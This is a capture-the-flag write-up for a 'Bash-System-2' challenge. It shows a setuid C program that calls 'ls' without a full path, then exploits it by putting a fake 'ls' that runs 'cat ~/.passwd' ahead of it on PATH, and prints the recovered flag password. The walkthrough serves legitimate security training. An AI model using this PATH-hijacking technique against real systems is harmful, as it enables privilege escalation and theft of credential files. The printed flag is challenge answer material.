---
layout: default
title: Bash-System-2
---
Here in the challenge we get the source code:

```C
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
    setreuid(geteuid(), geteuid());
    system("ls -lA /challenge/app-script/ch12/.passwd");
    return 0;
}
```

This is same as [Bash-System-1](Bash-System-1).

The binary file is compiled with SUID bit. 

We can create our own `ls` command and put it inside `/tmp/ch12/ls`, and then changing the `PATH` variable to point into it.

First, create the folder:
```bash
mkdir -p /tmp/ch12
```

Then, set the `PATH` varaible:
```bash
export PATH=/tmp/ch12:$PATH
```

Now, we can create the fake `ls`:
```bash
echo -e '#!/bin/bash\ncat ~/.passwd' > /tmp/ch12/ls
chmod +x /tmp/ch12/ls
```

and trigger it:
```bash
app-script-ch12@challenge02:/tmp/ch12$ ~/ch12
8a95eDS/*e_T#
```
